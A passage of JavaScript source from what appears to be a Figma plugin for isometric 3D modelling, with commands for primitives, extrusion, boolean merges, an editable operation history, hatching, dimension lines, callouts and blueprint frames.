  torus: { name: "Torus", keys: { R: 60, r: 18, segments: 40, sides: 16 } },
  prism: { name: "Prism", keys: { r: 60, h: 60, sides: 6 } },
  wedge: { name: "Wedge", keys: { w: 160, d: 120, h: 80 } },
  stairs: { name: "Stairs", keys: { w: 120, d: 160, h: 100, steps: 5 } },
};

function cmdPrimitive(msg) {
  const spec = PRIMITIVES[msg.shape];
  if (!spec) throw new Error("Unknown shape.");
  const op = { type: msg.shape };
  for (const k of Object.keys(spec.keys)) op[k] = num(msg[k], spec.keys[k]);
  const g = placeNew(newSolidData(msg, spec.name, [op]), msg, null);
  figma.currentPage.selection = [g];
  return `${spec.name} created — edit it from the Edit tab.`;
}

// Whole-solid transforms, added as History steps.
function cmdTransform(msg) {
  const { group, data } = requireOneSolid();
  const axis = ["x", "y", "z"].indexOf(msg.axis) >= 0 ? msg.axis : "x";
  let op;
  if (msg.mode === "move") op = { type: "move", x: num(msg.x, 0), y: num(msg.y, 0), z: num(msg.z, 0) };
  else if (msg.mode === "scale") op = { type: "scale", x: num(msg.x, 100), y: num(msg.y, 100), z: num(msg.z, 100) };
  else if (msg.mode === "mirror") op = { type: "mirror", axis, copy: msg.copy !== false, gap: num(msg.gap, 0) };
  else if (msg.mode === "array") op = { type: "array", axis, count: num(msg.count, 3), gap: num(msg.gap, 20) };
  else if (msg.mode === "radial") op = { type: "radial", count: num(msg.count, 6), radius: num(msg.radius, 80), angle: num(msg.angle, 360) };
  else throw new Error("Unknown transform.");
  if (op.type === "scale" && (op.x <= 0 || op.y <= 0 || op.z <= 0)) throw new Error("Scale must be above 0%.");
  data.ops.push(op);
  saveSolid(group, data);
  figma.currentPage.selection = [group];
  return opView(op).label + " added.";
}

function cmdExtrude(msg) {
  const { shapes } = selectionParts();
  if (!shapes.length) throw new Error("Select a flat shape to extrude.");
  const made = [];
  for (const shape of shapes) {
    const loops = shapeLoops(shape);
    const b = loopBounds(loops);
    const uv = roundLoops(loops.map((l) => l.map(([x, y]) => [x - b.minX, y - b.minY])));
    const op = { type: "extrude", plane: msg.plane || "top", depth: num(msg.depth, 40), loops: uv };
    made.push(placeNew(newSolidData(msg, shape.name, [op]), msg, shape));
  }
  figma.currentPage.selection = made;
  return `Extruded ${made.length} shape${made.length === 1 ? "" : "s"}.`;
}

function cmdRevolve(msg) {
  const { shapes } = selectionParts();
  if (!shapes.length) throw new Error("Select a flat profile to revolve. Its left edge is the axis.");
  const made = [];
  for (const shape of shapes) {
    const loops = shapeLoops(shape);
    const b = loopBounds(loops);
    // r grows to the right of the left edge, z grows upwards from the bottom.
    const rz = roundLoops(loops.map((l) => l.map(([x, y]) => [x - b.minX, b.maxY - y])));
    const op = { type: "revolve", loops: rz, segments: num(msg.segments, 48), axis: num(msg.axis, 0) };
    made.push(placeNew(newSolidData(msg, shape.name, [op]), msg, shape));
  }
  figma.currentPage.selection = made;
  return `Revolved ${made.length} profile${made.length === 1 ? "" : "s"}.`;
}

function requireOneSolid() {
  const { solids, shapes } = selectionParts();
  if (solids.length !== 1) throw new Error(solids.length ? "Select only one solid." : "Select a solid first.");
  return { group: solids[0], data: readSolid(solids[0]), shapes };
}

function solidAnchor(group, data) {
  const o = spaceOrigin(group);
  return { x: o.x + group.x + data.dx, y: o.y + group.y + data.dy };
}

// Screen point (relative to the solid's origin) -> model point on the plane
// perpendicular to `axis` at `at`, seen through `view` (null = unrotated).
// The mapping is affine, so solve it from three projected points.
function screenToPlaneView(sx, sy, axis, at, t, view) {
  if (!view || view.R === IDENTITY) return screenToPlane(sx, sy, axis, at, t);
  const to3 = planeTo3(axis, at);
  const f = (a, b) => {
    const v = view.apply(to3([a, b]));
    return [(v[0] - v[1]) * t.c, (v[0] + v[1]) * t.s - v[2]];
  };
  const O = f(0, 0), A = v3.sub(f(1, 0).concat(0), O.concat(0)), B = v3.sub(f(0, 1).concat(0), O.concat(0));
  const det = A[0] * B[1] - A[1] * B[0];
  if (Math.abs(det) < 1e-9) return null; // plane seen edge-on
  const dx = sx - O[0], dy = sy - O[1];
  return to3([(dx * B[1] - dy * B[0]) / det, (A[0] * dy - A[1] * dx) / det]);
}

function screenToPlane(sx, sy, axis, at, t) {
  if (axis === "z") {
    const a = sx / t.c, b = (sy + at) / t.s;
    return [(a + b) / 2, (b - a) / 2, at];
  }
  if (axis === "y") {
    const x = sx / t.c + at;
    return [x, at, (x + at) * t.s - sy];
  }
  const y = at - sx / t.c;
  return [at, y, (at + y) * t.s - sy];
}

// Finds the visible face facing +axis under a screen point; returns its plane offset.
function faceUnder(mesh, sx, sy, axis, t, view) {
  const k = AXES[axis];
  const toViewer = viewDir(t);
  const v = view || viewOf({});
  let best = null;
  for (const p of mesh) {
    if (p.n[k] < 0.999 || v3.dot(v.applyN(p.n), toViewer) <= 0) continue;
    const at = p.v[0][k];
    const w = screenToPlaneView(sx, sy, axis, at, t, v);
    if (!w) continue;
    let inside = true;
    for (let i = 0; i < p.v.length && inside; i++) {
      const a = p.v[i], b = p.v[(i + 1) % p.v.length];
      if (v3.dot(v3.cross(v3.sub(b, a), v3.sub(w, a)), p.n) < -1e-3) inside = false;
    }
    if (!inside) continue;
    const depth = v3.dot(v.apply(w), toViewer);
    if (!best || depth > best.depth) best = { at, depth };
  }
  return best ? best.at : null;
}

function cmdPush(msg) {
  const { group, data, shapes } = requireOneSolid();
  if (!shapes.length) throw new Error("Draw a shape over a face of the solid, then select both.");
  const axis = FACE_AXIS[msg.face || "top"];
  const t = trig(num(data.angle, 30));
  const anchor = solidAnchor(group, data);
  const mesh = evaluateOps(data.ops);
  const b = bounds3(mesh);
  const view = viewOf(data);
  for (const shape of shapes) {
    const loops = shapeLoops(shape).map((l) => l.map(([x, y]) => [x - anchor.x, y - anchor.y]));
    const lb = loopBounds(loops);
    let at = faceUnder(mesh, (lb.minX + lb.maxX) / 2, (lb.minY + lb.maxY) / 2, axis, t, view);
    if (at === null) at = b.max[AXES[axis]];
    const mapped = loops.map((l) => l.map(([sx, sy]) => screenToPlaneView(sx, sy, axis, at, t, view)));
    if (mapped.some((l) => l.some((p) => !p))) throw new Error(`That face is edge-on at this rotation — rotate the solid a little first.`);
    const plane = mapped.map((l) => l.map((p) => planeTo2(axis, p)));
    data.ops.push({ type: "push", axis, at: round2(at), depth: num(msg.depth, -20), through: !!msg.through, loops: roundLoops(plane) });
  }
  saveSolid(group, data);
  shapes.forEach((s) => s.remove());
  figma.currentPage.selection = [group];
  const d = num(msg.depth, -20);
  return msg.through ? "Cut through." : d >= 0 ? `Extruded ${d}px.` : `Pushed in ${-d}px.`;
}

function cmdLoopCut(msg) {
  const { group, data } = requireOneSolid();
  const count = Math.max(1, Math.min(24, Math.round(num(msg.count, 1))));
  const axis = ["x", "y", "z"].indexOf(msg.axis) >= 0 ? msg.axis : "z";
  data.ops.push({ type: "loopcut", id: "L" + Date.now().toString(36) + Math.floor(Math.random() * 1e4), axis, count, slide: 0, scales: Array(count + 2).fill(100) });
  saveSolid(group, data);
  figma.currentPage.selection = [group];
  return `Added ${count} loop${count === 1 ? "" : "s"} — slide, scale or extrude them below.`;
}

function cmdSegPush(msg) {
  const { group, data } = requireOneSolid();
  const loop = data.ops.find((o) => o.type === "loopcut" && o.id === msg.loopId);
  if (!loop) throw new Error("Add a loop cut first.");
  const depth = num(msg.depth, 10);
  // One step per picked strip, so each stays editable on its own.
  const list = (Array.isArray(msg.segments) && msg.segments.length ? msg.segments : [msg.segment]).map((v) => Math.max(0, Math.round(num(v, 0))));
  const face = FACE_DIR[msg.face] ? msg.face : "left";
  for (const segment of list) data.ops.push({ type: "segpush", loopId: loop.id, segment, face, depth });
  saveSolid(group, data);
  figma.currentPage.selection = [group];
  const what = list.length === 1 ? `segment ${list[0] + 1}` : `${list.length} segments`;
  return depth >= 0 ? `Extruded ${what}.` : `Pushed in ${what}.`;
}

function cmdFacePush(msg) {
  const { faces } = selectionParts();
  if (!faces.length) throw new Error("⌘/Ctrl-click a face of a solid to select it first.");
  const depth = num(msg.depth, 10);
  if (!depth) throw new Error("Set a depth other than 0.");
  const groups = [];
  for (const f of faces) {
    let g = groups.find((x) => x.solid === f.solid);
    if (!g) groups.push((g = { solid: f.solid, data: readSolid(f.solid) }));
    g.data.ops.push({ type: "facepush", n: f.face.n, w: f.face.w, bounds: f.face.bounds, depth, name: f.node.name.replace(/^Face · /, "") });
  }
  for (const g of groups) saveSolid(g.solid, g.data);
  figma.currentPage.selection = groups.map((g) => g.solid);
  const what = faces.length === 1 ? "face" : faces.length + " faces";
  return depth > 0 ? `Extruded ${what} ${depth}px.` : `Pushed ${what} in ${-depth}px.`;
}

function cmdCut(msg) {
  const { group, data } = requireOneSolid();
  const pct = num(msg.pct, 50);
  data.ops.push({ type: "cut", preset: msg.preset || "quarter", fx: pct, fy: pct, fz: pct });
  saveSolid(group, data);
  figma.currentPage.selection = [group];
  return "Section cut added.";
}

function cmdMerge(msg) {
  const { solids } = selectionParts();
  if (solids.length !== 2) throw new Error("Select exactly two solids.");
  // Like Figma's booleans: the lower layer is the base, the upper one the tool.
  const order = (n) => {
    const path = [];
    for (let p = n; p.parent; p = p.parent) path.unshift(p.parent.children.indexOf(p));
    return path;
  };
  const cmp = (a, b) => {
    const pa = order(a), pb = order(b);
    for (let i = 0; i < Math.min(pa.length, pb.length); i++) if (pa[i] !== pb[i]) return pa[i] - pb[i];
    return pa.length - pb.length;
  };
  const [baseNode, toolNode] = solids.slice().sort(cmp);
  const base = readSolid(baseNode), tool = readSolid(toolNode);
  const t = trig(num(base.angle, 30));
  const a = solidAnchor(baseNode, base), b = solidAnchor(toolNode, tool);
  // The tool keeps its on-screen position and orientation: offset D (view
  // space, on the ground plane) moves it from its origin to the base's.
  const D = screenToPlane(b.x - a.x, b.y - a.y, "z", 0, t);
  const RB = viewOf(base).R, RT = viewOf(tool).R;
  const pB = base.pivot || [0, 0, 0], pT = tool.pivot || [0, 0, 0];
  const M = matMul(matT(RB), RT);
  // u -> RB^T (RT (u - pT) + pT + D - pB) + pB
  const off = v3.add(matVec(matT(RB), v3.add(v3.sub(v3.add(matVec(RT, v3.scale(pT, -1)), pT), pB), D)), pB);
  const op = { type: "merge", mode: msg.mode === "subtract" ? "subtract" : "union", name: tool.name, ox: round2(off[0]), oy: round2(off[1]), oz: round2(off[2]), ops: tool.ops };
  if (RB !== IDENTITY || RT !== IDENTITY) op.m = M.map((row) => row.map((x) => Math.round(x * 1e6) / 1e6));
  base.ops.push(op);
  saveSolid(baseNode, base);
  toolNode.remove();
  figma.currentPage.selection = [baseNode];
  return msg.mode === "subtract" ? "Subtracted." : "Joined.";
}

// ---- history ----

function opView(op) {
  const n = (key, label, step) => ({ key, label, type: "number", value: op[key], step: step || 1 });
  const AX = { x: "X", y: "Y", z: "Z" };
  switch (op.type) {
    case "box": return { label: "Box", fields: [n("w", "W"), n("d", "D"), n("h", "H")] };
    case "cylinder": return { label: "Cylinder", fields: [n("r", "R"), n("h", "H"), n("segments", "Seg")] };
    case "extrude": return { label: "Extrude · " + op.plane, fields: [n("depth", "Depth")] };
    case "revolve": return { label: "Revolve", fields: [n("axis", "Axis"), n("segments", "Seg")] };
    case "push": return {
      label: (op.through ? "Cut through" : num(op.depth, 0) >= 0 ? "Extrude" : "Push in") + " · " + AXIS_FACE[op.axis],
      fields: [n("depth", "Depth"), n("at", AX[op.axis]), { key: "through", label: "Thru", type: "bool", value: !!op.through }],
    };
    case "cut": {
      const f = op.preset === "quarter" ? [n("fx", "X%"), n("fy", "Y%")] : op.preset === "left" ? [n("fy", "Y%")] : op.preset === "right" ? [n("fx", "X%")] : [n("fz", "Z%")];
      return { label: "Section · " + op.preset, fields: f };
    }
    case "merge": return { label: (op.mode === "subtract" ? "Subtract " : "Union ") + (op.name || ""), fields: [n("ox", "X"), n("oy", "Y"), n("oz", "Z")] };
    case "sphere": return { label: "Sphere", fields: [n("r", "R"), n("segments", "Seg")] };
    case "cone": return { label: num(op.r2, 0) > 0 ? "Frustum" : "Cone", fields: [n("r1", "R base"), n("r2", "R top"), n("h", "H"), n("segments", "Seg")] };
    case "tube": return { label: "Tube", fields: [n("r", "R"), n("ri", "R in"), n("h", "H"), n("segments", "Seg")] };
    case "torus": return { label: "Torus", fields: [n("R", "R"), n("r", "Tube"), n("segments", "Seg")] };
    case "prism": return { label: `Prism · ${op.sides} sides`, fields: [n("r", "R"), n("h", "H"), n("sides", "Sides")] };
    case "wedge": return { label: "Wedge", fields: [n("w", "W"), n("d", "D"), n("h", "H")] };
    case "stairs": return { label: `Stairs · ${op.steps} steps`, fields: [n("w", "W"), n("d", "D"), n("h", "H"), n("steps", "Steps")] };
    case "size": return { label: "Size", fields: [n("w", "W"), n("d", "D"), n("h", "H")] };
    case "move": return { label: "Move", fields: [n("x", "X"), n("y", "Y"), n("z", "Z")] };
    case "scale": return { label: "Scale", fields: [n("x", "X%"), n("y", "Y%"), n("z", "Z%")] };
    case "mirror": return { label: `Mirror ${AX[op.axis] || "X"}${op.copy === false ? " · flip" : ""}`, fields: op.copy === false ? [] : [n("gap", "Gap")] };
    case "array": return { label: `Array ×${op.count} · ${AX[op.axis] || "X"}`, fields: [n("count", "Count"), n("gap", "Gap")] };
    case "radial": return { label: `Radial array ×${op.count}`, fields: [n("count", "Count"), n("radius", "Radius"), n("angle", "Angle°")] };
    case "facepush": return { label: `${num(op.depth, 0) >= 0 ? "Extrude" : "Push in"} face · ${op.name || "face"}`, fields: [n("depth", "Depth")] };
    case "loopcut": return { label: `Loop cut ×${op.count} · ${LOOP_NAMES[op.axis] || op.axis}`, fields: [n("count", "Cuts"), n("slide", "Slide")] };
    case "segpush": return { label: `${num(op.depth, 0) >= 0 ? "Extrude" : "Inset"} segment ${num(op.segment, 0) + 1} · ${op.face}`, fields: [n("depth", "Depth"), n("segment", "Seg")] };
    default: return { label: op.type, fields: [] };
  }
}

const LOOP_NAMES = { z: "horizontal", x: "vertical L", y: "vertical R" };

function solidView(group) {
  const data = readSolid(group);
  if (!data) return null;
  const loops = [];
  data.ops.forEach((op, i) => {
    if (op.type !== "loopcut") return;
    const count = Math.max(1, Math.min(24, Math.round(num(op.count, 1))));
    loops.push({
      index: i, id: op.id, axis: op.axis, count, slide: num(op.slide, 0),
      label: `Loop cut ×${count} · ${LOOP_NAMES[op.axis] || op.axis}`,
      scales: Array.from({ length: count + 2 }, (_, j) => num(op.scales && op.scales[j], 100)),
    });
  });
  // Overall size, for the Size sliders. Reuse the mesh the renderer just built.
  const key = JSON.stringify(data.ops);
  const mesh = meshCache.key === key && meshCache.raw ? meshCache.raw : evaluateOps(data.ops);
  const b = mesh.length ? bounds3(mesh) : { min: [0, 0, 0], max: [0, 0, 0] };
  const size = { w: round2(b.max[0] - b.min[0]), d: round2(b.max[1] - b.min[1]), h: round2(b.max[2] - b.min[2]) };
  return {
    loops,
    size,
    name: group.name,
    smooth: num(data.smooth, 40),
    rot: data.rot || { x: 0, y: 0, z: 0 },
    ops: data.ops.map((op, i) => Object.assign({ index: i, enabled: op.enabled !== false }, opView(op))),
  };
}

function cmdOpEdit(msg) {
  const { group, data } = requireOneSolid();
  const op = data.ops[msg.index];
  if (msg.action === "resize") {
    // Live sizing keeps one trailing Size step and updates it in place.
    const v = msg.value || {};
    const last = data.ops[data.ops.length - 1];
    const step = last && last.type === "size" && last.enabled !== false ? last : { type: "size" };
    for (const k of ["w", "d", "h"]) if (v[k] !== undefined) step[k] = Math.max(1, Math.round(num(v[k], 1) * 10) / 10);
    if (step !== last) data.ops.push(step);
    saveSolid(group, data);
    figma.currentPage.selection = [group];
    return "Resized.";
  }
  if (!op && msg.action !== "rotate" && msg.action !== "smooth") throw new Error("That step no longer exists.");
  if (msg.action === "scales") {
    // Several rings at once: `rings` with matching `values` (percent).
    if (op.type !== "loopcut") throw new Error("That step isn't a loop cut.");
    const last = Math.max(1, Math.round(num(op.count, 1))) + 1;
    if (!op.scales) op.scales = Array.from({ length: last + 1 }, () => 100);
    (msg.rings || []).forEach((j, i) => {
      if (j >= 0 && j <= last) op.scales[j] = Math.max(1, Math.min(500, num(msg.values && msg.values[i], 100)));
    });
  } else if (msg.action === "toggle") op.enabled = op.enabled === false;
  else if (msg.action === "delete") {
    if (data.ops.filter((o) => o.enabled !== false).length <= 1 && op.enabled !== false) throw new Error("A solid needs at least one step.");
    data.ops.splice(msg.index, 1);
  } else if (msg.action === "up" || msg.action === "down") {
    const j = msg.index + (msg.action === "up" ? -1 : 1);
    if (j < 0 || j >= data.ops.length) return "Can't move further.";
    data.ops.splice(msg.index, 1);
    data.ops.splice(j, 0, op);
  } else if (msg.action === "set") {
    const m = /^scales\.(\d+)$/.exec(msg.key || "");
    if (m) {
      if (!op.scales) op.scales = [];
      op.scales[Number(m[1])] = Math.max(1, Math.min(500, num(msg.value, 100)));
    } else {
      op[msg.key] = typeof op[msg.key] === "boolean" || msg.key === "through" ? !!msg.value : num(msg.value, op[msg.key]);
    }
    if (op.type === "loopcut") {
      op.count = Math.max(1, Math.min(24, Math.round(num(op.count, 1))));
      op.slide = Math.max(-100, Math.min(100, num(op.slide, 0)));
      // One scale per ring, both ends included. The ends keep their scale
      // when the number of cuts changes; new inner rings start at 100%.
      const old = op.scales || [];
      const last = op.count + 1;
      op.scales = Array.from({ length: last + 1 }, (_, j) =>
        j === 0 ? num(old[0], 100) : j === last ? num(old.length ? old[old.length - 1] : 100, 100) : j < old.length - 1 ? num(old[j], 100) : 100);
    }
  } else if (msg.action === "rotate") {
    if (!data.rot) data.rot = { x: 0, y: 0, z: 0 };
    if (!data.pivot) {
      const b = bounds3(evaluateOps(data.ops));
      data.pivot = [0, 1, 2].map((k) => round2((b.min[k] + b.max[k]) / 2));
    }
    const clamp = (v) => Math.max(-180, Math.min(180, num(v, 0)));
    if (msg.value && typeof msg.value === "object") {
      for (const k of ["x", "y", "z"]) data.rot[k] = clamp(msg.value[k]);
    } else data.rot[msg.key] = clamp(msg.value);
  } else if (msg.action === "smooth") {
    data.smooth = Math.max(0, Math.min(89, num(msg.value, 40)));
  }
  saveSolid(group, data);
  figma.currentPage.selection = [group];
  return "Updated.";
}

function cmdBake(msg) {
  const { group } = requireOneSolid();
  group.setPluginData(SOLID_KEY, "");
  group.name = group.name + " (baked)";
  return "Baked to plain vectors — it's no longer editable as a solid.";
}

// ---------- styling ----------

function eachLeaf(node, fn) {
  if ("children" in node && node.type !== "INSTANCE" && node.type !== "BOOLEAN_OPERATION") {
    for (const child of node.children) eachLeaf(child, fn);
  } else {
    fn(node);
  }
}

function cmdStyle(msg) {
  const pal = palette(msg);
  let count = 0;
  for (const node of selection()) {
    const solidNode = findSolid(node);
    if (solidNode) {
      const data = readSolid(solidNode);
      data.style = solidStyle(msg);
      saveSolid(solidNode, data);
      count++;
      continue;
    }
    eachLeaf(node, (n) => {
      if (n.type === "TEXT") {
        n.fills = [solid(pal.stroke)];
      } else if ("strokes" in n) {
        n.strokes = [solid(pal.stroke)];
        n.strokeWeight = pal.strokeWeight;
        if ("strokeJoin" in n) n.strokeJoin = "ROUND";
        if ("fills" in n && Array.isArray(n.fills) && n.fills.length) n.fills = [solid(pal.top)];
      } else {
        return;
      }
      count++;
    });
  }
  return `Styled ${count} layer${count === 1 ? "" : "s"}.`;
}

function cmdHatch(msg) {
  const pal = palette(msg);
  const gap = Math.max(2, Number(msg.spacing) || 6);
  const made = [];
  for (const node of selection()) {
    const parent = node.parent;
    const b = node.absoluteBoundingBox;
    if (!b || !parent || !("fills" in node)) continue;
    const o = absToLocal(parent.type === "GROUP" ? groupFrame(parent) : parent, b.x, b.y);
    const segs = [];
    // 45° lines running from top-right to bottom-left across the bounding box.
    for (let s = gap / 2; s < b.width + b.height; s += gap) {
      segs.push(["M", o.x + s, o.y], ["L", o.x + s - b.height, o.y + b.height]);
    }
    const lines = makeVector(parent, "Hatch lines", [segs], { stroke: pal.stroke, strokeWeight: Math.max(0.5, pal.strokeWeight * 0.6) });
    const mask = node.clone();
    parent.insertChild(parent.children.indexOf(node) + 1, mask);
    mask.name = "Hatch mask";
    if ("strokes" in mask) mask.strokes = [];
    if ("fills" in mask) mask.fills = [solid({ r: 0, g: 0, b: 0 })];
    const index = parent.children.indexOf(node) + 1;
    const g = figma.group([mask, lines], parent, index);
    g.insertChild(0, mask);
    mask.isMask = true;
    g.name = "Hatch — " + node.name;
    made.push(g);
  }
  figma.currentPage.selection = made;
  return made.length ? "Hatching added." : "Nothing to hatch.";
}

// Groups share their coordinate space with the nearest non-group ancestor.
function groupFrame(node) {
  let p = node;
  while (p.type === "GROUP") p = p.parent;
  return p;
}

// ---------- annotation ----------

function topFrame(node) {
  let p = node;
  while (p.parent && p.parent.type !== "PAGE") p = p.parent;
  return p.type === "FRAME" ? p : figma.currentPage;
}

// A straight line with optional arrow / tick caps, between absolute points.
async function lineNode(container, a, b, color, capA, capB, name) {
  const la = absToLocal(container, a.x, a.y), lb = absToLocal(container, b.x, b.y);
  const line = figma.createVector();
  container.appendChild(line);
  line.name = name || "Line";
  line.strokes = [solid(color)];
  line.strokeWeight = 1;
  await line.setVectorNetworkAsync({
    vertices: [{ x: 0, y: 0, strokeCap: capA || "NONE" }, { x: lb.x - la.x, y: lb.y - la.y, strokeCap: capB || "NONE" }],
    segments: [{ start: 0, end: 1 }],
    regions: [],
  });
  line.x = Math.min(la.x, lb.x);
  line.y = Math.min(la.y, lb.y);
  return line;
}

const UNITS = { px: "px", mm: "mm", cm: "cm", in: "in" };

// Width / depth / height dimension lines for a solid, drafted along its iso edges.
async function cmdDimension(msg) {
  const { group, data } = requireOneSolid();
  const pal = palette(msg);
  const t = trig(num(data.angle, 30));
  let mesh = evaluateOps(data.ops);
  if (!mesh.length) throw new Error("Nothing to measure.");
  const view = viewOf(data);
  if (isRotated(data)) mesh = transformPolys(mesh, view.apply, view.applyN);
  const b = bounds3(mesh);
  const anchor = solidAnchor(group, data);
  const P = (x, y, z) => ({ x: anchor.x + (x - y) * t.c, y: anchor.y + (x + y) * t.s - z });
  const container = topFrame(group);
  const off = num(msg.offset, 28), tick = 6;
  const scale = num(msg.scale, 1), unit = UNITS[msg.units] || "px";
  const dec = Math.max(0, Math.min(3, Math.round(num(msg.decimals, 0))));
  const fmt = (len) => (len * scale).toFixed(dec) + (unit === "px" && scale === 1 ? "" : " " + unit);
  const nodes = [];
  // One dimension: a measured span from p0 to p1 (world), drawn `out` away.
  const dim = async (p0, p1, out, rotation, lift) => {
    const a = P(p0[0] + out[0], p0[1] + out[1], p0[2] + out[2]);
    const c = P(p1[0] + out[0], p1[1] + out[1], p1[2] + out[2]);
    const ext = (p) => {
      const k = (off + tick) / off;
      return [P(p[0] + out[0] * (4 / off), p[1] + out[1] * (4 / off), p[2] + out[2] * (4 / off)), P(p[0] + out[0] * k, p[1] + out[1] * k, p[2] + out[2] * k)];
    };
    for (const p of [p0, p1]) { const e = ext(p); nodes.push(await lineNode(container, e[0], e[1], pal.stroke, "NONE", "NONE", "Extension")); }
    nodes.push(await lineNode(container, a, c, pal.stroke, "ARROW_LINES", "ARROW_LINES", "Dimension"));
    const len = Math.hypot(p1[0] - p0[0], p1[1] - p0[1], p1[2] - p0[2]);
    const text = await makeText(container, fmt(len), pal.stroke, 10);
    text.name = "Dimension value";
    // Centre the rotated label on the line, lifted off it.
    const rad = (rotation * Math.PI) / 180, w = text.width, h = text.height;
    const mid = { x: (a.x + c.x) / 2 + lift.x, y: (a.y + c.y) / 2 + lift.y };
    const cx = Math.cos(rad) * (w / 2) + Math.sin(rad) * (h / 2), cy = -Math.sin(rad) * (w / 2) + Math.cos(rad) * (h / 2);
    text.rotation = rotation;
    const o = absToLocal(container, mid.x - cx, mid.y - cy);
    text.x = o.x;
    text.y = o.y;
    nodes.push(text);
  };
  const [x0, y0, z0] = b.min, [x1, y1, z1] = b.max;
  const which = msg.which || { w: true, d: true, h: true };
  if (which.w !== false && x1 - x0 > 0.5) await dim([x0, y1, z0], [x1, y1, z0], [0, off, 0], -30, { x: -5, y: 9 });
  if (which.d !== false && y1 - y0 > 0.5) await dim([x1, y0, z0], [x1, y1, z0], [off, 0, 0], 30, { x: 5, y: 9 });
  if (which.h !== false && z1 - z0 > 0.5) await dim([x1, y0, z0], [x1, y0, z1], [off * 0.7, -off * 0.7, 0], 90, { x: 10, y: 0 });
  if (!nodes.length) throw new Error("Nothing to measure.");
  const g = figma.group(nodes, container);
  g.name = "Dimensions — " + data.name;
  figma.currentPage.selection = [group];
  return "Dimensions added.";
}

async function cmdCallout(msg) {
  const pal = palette(msg);
  const made = [];
  for (const node of selection()) {
    const g = await addCallout(node, msg.text || node.name, { pal, reach: Number(msg.reach) || 80 });
    if (g) made.push(g);
  }
  figma.currentPage.selection = made;
  return made.length ? "Callout added." : "Nothing to annotate.";
}

// An arrowed leader + monospace label pointing at `node`. `side` forces
// "left" / "right" / "below"; by default the label goes to the nearer outside edge.
async function addCallout(node, labelText, opts) {
  const pal = opts.pal;
  {
    const b = node.absoluteBoundingBox;
    if (!b) return null;
    const container = topFrame(node);
    const cb = container.type === "PAGE" ? null : container.absoluteBoundingBox;
    const midX = cb ? cb.x + cb.width / 2 : b.x + b.width / 2 + 1;
    const onRight = opts.side ? opts.side === "right" : b.x + b.width / 2 >= midX;
    const label = labelText.toUpperCase();
    const text = await makeText(container, label, pal.stroke, 11);
    const reach = opts.reach || 80;
    const targetAbs = opts.target
      ? { x: b.x + b.width * opts.target[0], y: b.y + b.height * opts.target[1] }
      : { x: b.x + b.width / 2, y: b.y + b.height / 2 };
    const below = opts.side === "below";
    // "below" hangs the label under the part with a vertical leader up to it.
    const textY = below ? b.y + b.height + reach : targetAbs.y - text.height / 2;
    // `alignTo` lines the label up with another part's callouts.
    const ab = opts.alignTo ? opts.alignTo.absoluteBoundingBox : b;
    const textX = below ? targetAbs.x + 6 : onRight ? Math.max(b.x + b.width, ab.x + ab.width) + reach : Math.min(b.x, ab.x) - reach - text.width;
    const tl = absToLocal(container, textX, textY);
    text.x = tl.x;
    text.y = tl.y;

    const start = below
      ? absToLocal(container, targetAbs.x, textY + text.height + 14)
      : absToLocal(container, onRight ? textX - 8 : textX + text.width + 8, targetAbs.y);
    const end = absToLocal(container, targetAbs.x, targetAbs.y);
    const line = figma.createVector();
    container.appendChild(line);
    line.name = "Leader";
    line.strokes = [solid(pal.stroke)];
    line.strokeWeight = 1;
    await line.setVectorNetworkAsync({
      vertices: [
        { x: 0, y: 0, strokeCap: "NONE" },
        { x: end.x - start.x, y: end.y - start.y, strokeCap: "ARROW_LINES" },
      ],
      segments: [{ start: 0, end: 1 }],
      regions: [],
    });
    line.x = Math.min(start.x, end.x);
    line.y = Math.min(start.y, end.y);

    const g = figma.group([line, text], container);
    g.name = "Callout — " + label;
    return g;
  }
}

async function cmdFrame(msg) {
  const pal = palette(msg);
  const W = num(msg.sheetW, 1200), H = num(msg.sheetH, 800), M = 80, GRID = 16;
  const c = viewportCenter();
  const frame = figma.createFrame();
  frame.name = "Blueprint — " + (msg.fig || "FIG.001");
  frame.resize(W, H);
  frame.x = c.x - W / 2;
  frame.y = c.y - H / 2;
  frame.fills = [solid(mix(pal.top, pal.stroke, 0.025))];

  const segs = [];
  for (let x = M; x <= W - M; x += GRID) segs.push(["M", x, M], ["L", x, H - M]);
  for (let y = M; y <= H - M; y += GRID) segs.push(["M", M, y], ["L", W - M, y]);
  const grid = makeVector(frame, "Grid", [segs], { stroke: pal.stroke, strokeWeight: 0.5 });
  grid.opacity = 0.07;
  grid.locked = true;

  const ink = mix(pal.stroke, { r: 0.45, g: 0.45, b: 0.5 }, 0.7);
  const fig = await makeText(frame, msg.fig || "FIG.001", ink, 10);
  fig.rotation = -90;
  fig.x = M - 12; // rotated -90°: x is the label's right edge
  fig.y = M;

  const title = await makeText(frame, `[ ${(msg.title || "Untitled Drawing").toUpperCase()} ]`, ink, 10);
  title.rotation = -90;
  title.x = W - M + 12 + title.height;
  title.y = M;

  const year = await makeText(frame, msg.year ? "© " + msg.year : "© 1986", ink, 10);
  year.rotation = -90;
  year.x = W - M + 12 + year.height;
  year.y = H - M - year.width;

  figma.currentPage.selection = [frame];
  figma.viewport.scrollAndZoomIntoView([frame]);
  return "Blueprint frame created.";
}

// ---------- examples ----------
// Complex models built only from the plugin's own operations, so every part
// arrives as an editable solid with its full history.

const exRect = (x, y, w, h) => [[x, y], [x + w, y], [x + w, y + h], [x, y + h]];
const exCircle = (cx, cy, r, n) => Array.from({ length: n || 32 }, (_, i) => [cx + r * Math.cos((i / (n || 32)) * Math.PI * 2), cy + r * Math.sin((i / (n || 32)) * Math.PI * 2)]);
const exAt = (ops, ox, oy, oz, mode) => ({ type: "merge", mode: mode || "union", name: "part", ox, oy, oz, ops });
const exBox = (x, y, z, w, d, h) => exAt([{ type: "box", w, d, h }], x, y, z);
const exCyl = (x, y, z, r, h, segments) => exAt([{ type: "cylinder", r, h, segments: segments || 32 }], x, y, z);
// Scales every length in a list of operations (sizes, depths, offsets,
// outlines) so an example can be authored small and placed at any size.
function exScale(ops, k) {
  const LEN = ["w", "d", "h", "r", "depth", "at", "ox", "oy", "oz"];
  return ops.map((op) => {
    const o = Object.assign({}, op);
    for (const key of LEN) if (typeof o[key] === "number") o[key] = Math.round(o[key] * k * 100) / 100;
    if (o.type === "revolve" && typeof o.axis === "number") o.axis = Math.round(o.axis * k * 100) / 100;
    if (o.loops) o.loops = o.loops.map((l) => l.map((p) => p.map((c) => Math.round(c * k * 100) / 100)));
    if (o.ops) o.ops = exScale(o.ops, k);
    return o;
  });
}

// Rotates a model so its vertical axis points along +y (towards the left face).
const FACE_LEFT = [[1, 0, 0], [0, 0, 1], [0, -1, 0]];

function keyswitchParts() {
